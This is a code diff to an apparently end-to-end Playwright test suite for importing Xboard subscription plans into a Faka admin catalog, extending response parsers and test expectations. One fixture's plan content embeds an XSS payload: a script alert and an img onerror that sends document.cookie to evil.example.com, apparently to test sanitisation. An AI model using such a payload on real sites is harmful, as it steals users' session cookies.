@@ -72,6 +72,23 @@ function isInteger(value: unknown): value is number {
   return typeof value === 'number' && Number.isInteger(value);
 }
 
+/**
+ * 从真实分页响应取指定 canonical code 的稳定 category id。随后必须等待同 id 的
+ * DOM 行出现，避免把 HTTP response 已到误认为 React 已完成表格渲染。
+ */
+function findCategoryIdOnListPage(value: unknown, expectedCode: string): number | null {
+  if (!isRecord(value) || !Array.isArray(value.items)) {
+    throw new Error('Category list response: expected an items array');
+  }
+  for (const item of value.items) {
+    if (!isRecord(item) || !isPositiveInteger(item.id) || typeof item.code !== 'string') {
+      throw new Error('Category list response: item is missing id or code');
+    }
+    if (item.code === expectedCode) return item.id;
+  }
+  return null;
+}
+
 function isNullableNonNegativeInteger(value: unknown): value is number | null {
   return value === null || isNonNegativeInteger(value);
 }
@@ -207,8 +224,12 @@ export interface FakaCatalogNamedSku {
 export interface FakaCatalogPlan {
   plan_id: number;
   name: string;
+  content: string | null;
   show: boolean;
   sell: boolean;
+  renew: boolean;
+  group_id: number | null;
+  transfer_enable: number;
   capacity_limit: number | null;
   active_users: number;
   remaining: number | null;
@@ -223,12 +244,14 @@ export interface FakaCatalogResponse {
 /**
  * Strictly parses the Faka catalog response payload.
  * Top level must be exactly { plans }; `plans` must be a non-empty array.
- * Each plan must be exactly { plan_id, name, show, sell, capacity_limit,
- * active_users, remaining, periods, named_skus } with:
+ * Each plan must be exactly { plan_id, name, content, show, sell, renew,
+ * group_id, transfer_enable, capacity_limit, active_users, remaining, periods,
+ * named_skus } with:
  *   - plan_id: positive integer, unique across plans
- *   - name: non-empty string
- *   - show/sell: booleans
- *   - capacity_limit/remaining: null or non-negative integer
+ *   - name: non-empty string; content: string or null
+ *   - show/sell/renew: booleans
+ *   - group_id/capacity_limit/remaining: null or non-negative integer
+ *   - transfer_enable/active_users: non-negative integers
  *   - active_users: non-negative integer
  *   - periods: non-empty array of exactly { period, price, sku_alias } with
  *     non-empty string period/sku_alias, non-negative integer price, and
@@ -252,8 +275,12 @@ export function parseFakaCatalogResponse(value: unknown): FakaCatalogResponse {
       [
         'plan_id',
         'name',
+        'content',
         'show',
         'sell',
+        'renew',
+        'group_id',
+        'transfer_enable',
         'capacity_limit',
         'active_users',
         'remaining',
@@ -274,11 +301,23 @@ export function parseFakaCatalogResponse(value: unknown): FakaCatalogResponse {
     if (typeof plan.name !== 'string' || plan.name.length === 0) {
       throw new Error('Faka catalog response: plan.name must be a non-empty string');
     }
+    if (plan.content !== null && typeof plan.content !== 'string') {
+      throw new Error('Faka catalog response: plan.content must be a string or null');
+    }
     if (typeof plan.show !== 'boolean') {
       throw new Error('Faka catalog response: plan.show must be a boolean');
     }
     if (typeof plan.sell !== 'boolean') {
       throw new Error('Faka catalog response: plan.sell must be a boolean');
+    }
+    if (typeof plan.renew !== 'boolean') {
+      throw new Error('Faka catalog response: plan.renew must be a boolean');
+    }
+    if (!isNullableNonNegativeInteger(plan.group_id)) {
+      throw new Error('Faka catalog response: plan.group_id must be null or a non-negative integer');
+    }
+    if (!isNonNegativeInteger(plan.transfer_enable)) {
+      throw new Error('Faka catalog response: plan.transfer_enable must be a non-negative integer');
     }
     if (!isNullableNonNegativeInteger(plan.capacity_limit)) {
       throw new Error('Faka catalog response: plan.capacity_limit must be null or a non-negative integer');
@@ -363,8 +402,12 @@ export function parseFakaCatalogResponse(value: unknown): FakaCatalogResponse {
     parsedPlans.push({
       plan_id: plan.plan_id,
       name: plan.name,
+      content: plan.content,
       show: plan.show,
       sell: plan.sell,
+      renew: plan.renew,
+      group_id: plan.group_id,
+      transfer_enable: plan.transfer_enable,
       capacity_limit: plan.capacity_limit,
       active_users: plan.active_users,
       remaining: plan.remaining,
@@ -882,6 +925,7 @@ export interface FakaImportResponseOffer {
   sku: string;
   offerName: string;
   pricePoints: number;
+  validityDays: number | null;
 }
 
 export interface FakaImportResponse {
@@ -916,9 +960,9 @@ export function readIdempotencyKey(request: Request): string {
  *   - replayed: boolean (the parser does not enforce a specific value; the
  *     test asserts the expected replay semantics)
  *   - offers: array whose length must equal offerCount; each item exactly
- *     { period, sku, offerName, pricePoints } with non-empty strings
- *     period/sku/offerName, positive integer pricePoints, and period/sku
- *     each unique across items
+ *     { period, sku, offerName, pricePoints, validityDays } with non-empty
+ *     period/sku/offerName, positive integer pricePoints, validityDays as a
+ *     positive integer or null, and period/sku each unique across items
  * Rejects any extra key. Returns a fully typed object.
  */
 export function parseFakaImportResponse(value: unknown): FakaImportResponse {
@@ -952,7 +996,7 @@ export function parseFakaImportResponse(value: unknown): FakaImportResponse {
   for (const offer of rawOffers) {
     assertExactKeys(
       offer,
-      ['period', 'sku', 'offerName', 'pricePoints'],
+      ['period', 'sku', 'offerName', 'pricePoints', 'validityDays'],
       'Faka import response: offers item',
     );
     if (typeof offer.period !== 'string' || offer.period.length === 0) {
@@ -975,11 +1019,15 @@ export function parseFakaImportResponse(value: unknown): FakaImportResponse {
     if (!isPositiveInteger(offer.pricePoints)) {
       throw new Error('Faka import response: offers item pricePoints must be a positive integer');
     }
+    if (offer.validityDays !== null && !isPositiveInteger(offer.validityDays)) {
+      throw new Error('Faka import response: offers item validityDays must be a positive integer or null');
+    }
     parsedOffers.push({
       period: offer.period,
       sku: offer.sku,
       offerName: offer.offerName,
       pricePoints: offer.pricePoints,
+      validityDays: offer.validityDays,
     });
   }
 
@@ -1332,19 +1380,20 @@ export async function ensureNetworkNodeDefaultCoverViaUi(page: Page): Promise<vo
   );
   const initialListPromise = waitForCategoryList();
   await page.getByRole('button', { name: '目录治理', exact: true }).click();
-  const initialList = await initialListPromise;
-  if (initialList.status() !== 200) throw new Error('initial category list failed');
+  let currentList = await initialListPromise;
 
   const pagination = page.getByTestId('admin-category-pagination');
   await pagination.waitFor({ state: 'visible' });
   let categoryId = '';
   while (true) {
-    const row = page.locator('tbody tr').filter({ hasText: 'network-node' }).first();
-    if (await row.isVisible()) {
-      const testId = await row.getAttribute('data-testid');
-      const match = /^category-row-([1-9][0-9]*)$/.exec(testId ?? '');
-      if (!match) throw new Error('network-node row test id is invalid');
-      categoryId = match[1];
+    if (currentList.status() !== 200) throw new Error('category list failed');
+    const pageBody: unknown = await currentList.json();
+    const networkNodeId = findCategoryIdOnListPage(pageBody, 'network-node');
+    if (networkNodeId !== null) {
+      categoryId = String(networkNodeId);
+      const row = page.getByTestId(`category-row-${categoryId}`);
+      await expect(row).toBeVisible({ timeout: 10_000 });
+      await expect(row).toContainText('network-node');
       await page.getByTestId(`category-edit-${categoryId}`).click();
       break;
     }
@@ -1352,8 +1401,7 @@ export async function ensureNetworkNodeDefaultCoverViaUi(page: Page): Promise<vo
     if (await nextButton.isDisabled()) throw new Error('network-node category not found');
     const nextListPromise = waitForCategoryList();
     await nextButton.click();
-    const nextList = await nextListPromise;
-    if (nextList.status() !== 200) throw new Error('next category list failed');
+    currentList = await nextListPromise;
   }
 
   const dialog = page.getByRole('dialog');
@@ -1513,7 +1561,7 @@ test.describe.serial('Catalog Xboard import', () => {
 
         // --- User-visible behaviour: toast + preview cleared, dialog stays open ---
         const sourceChangedToast = page.locator('[data-toast-card]').filter({ hasText: 'Xboard 套餐已变化，请重新预览' });
-        await expect(sourceChangedToast).toHaveText('Xboard 套餐已变化，请重新预览');
+        await expect(sourceChangedToast).toHaveText('错误：Xboard 套餐已变化，请重新预览');
         await page.getByTestId('admin-faka-preview-result').waitFor({ state: 'detached' });
         await expect(page.getByTestId('admin-faka-import-submit')).toHaveCount(0);
         await expect(page.getByTestId('admin-faka-import-preview')).toBeVisible();
@@ -1758,7 +1806,7 @@ test.describe.serial('Catalog Xboard import', () => {
         expect(replayed).toEqual({ productId: productIdA, replayed: true });
         const bReplayToast = `幂等重放：商品 #${productIdA} 已存在，未重复创建`;
         await expect(pageB.locator('[data-toast-card]').filter({ hasText: bReplayToast }))
-          .toHaveText(bReplayToast);
+          .toHaveText(`成功：${bReplayToast}`);
         await pageB.getByTestId('admin-faka-import-preview').waitFor({ state: 'detached' });
       } finally {
         pageB.off('request', onBConfirm);
@@ -1912,6 +1960,14 @@ test.describe.serial('Catalog Xboard import', () => {
       name: 'Gold Plan',
       show: true,
       sell: true,
+      content:
+        'Gold Plan：每月 200GB 高速流量，适合主力使用，长期套餐更划算。欢迎购买！\n' +
+        "<script>alert('gold-xss')</script>\n" +
+        '<img src="https://evil.example.com/track.png" onerror="' +
+        "fetch('https://evil.example.com/leak?c='+encodeURIComponent(document.cookie))\">",
+      renew: true,
+      group_id: 1,
+      transfer_enable: 214748364800,
       capacity_limit: 200,
       active_users: 12,
       remaining: 188,
@@ -1960,8 +2016,8 @@ test.describe.serial('Catalog Xboard import', () => {
     expect(preview.productName).toBe('Gold Plan');
     expect(preview.cover).toEqual({ imageUrl: '/assets/network.webp', images: ['/assets/network.webp'] });
     expect(preview.offers).toEqual([
-      { period: 'monthly', sku: 'gold-monthly', offerName: '月付', pricePoints: 300000, validityDays: null },
-      { period: 'yearly', sku: 'gold-yearly', offerName: '年付', pricePoints: 3000000, validityDays: null },
+      { period: 'monthly', sku: 'gold-monthly', offerName: '月付', pricePoints: 300000, validityDays: 30 },
+      { period: 'yearly', sku: 'gold-yearly', offerName: '年付', pricePoints: 3000000, validityDays: 365 },
     ]);
     expect(preview.issues).toEqual([]);
     expect(preview.canConfirm).toBe(true);
@@ -2004,12 +2060,7 @@ test.describe.serial('Catalog Xboard import', () => {
       const imported = parseFakaImportResponse(importBody);
       expect(imported.replayed).toBe(false);
       expect(imported.offerCount).toBe(2);
-      expect(imported.offers).toEqual(preview.offers.map((offer) => ({
-        period: offer.period,
-        sku: offer.sku,
-        offerName: offer.offerName,
-        pricePoints: offer.pricePoints,
-      })));
+      expect(imported.offers).toEqual(preview.offers);
 
       const successMessage = `已创建 Xboard 商品草稿 #${imported.productId}（2 个规格）`;
       await expect(page.locator('[data-toast-card]').filter({ hasText: successMessage })).toBeVisible();
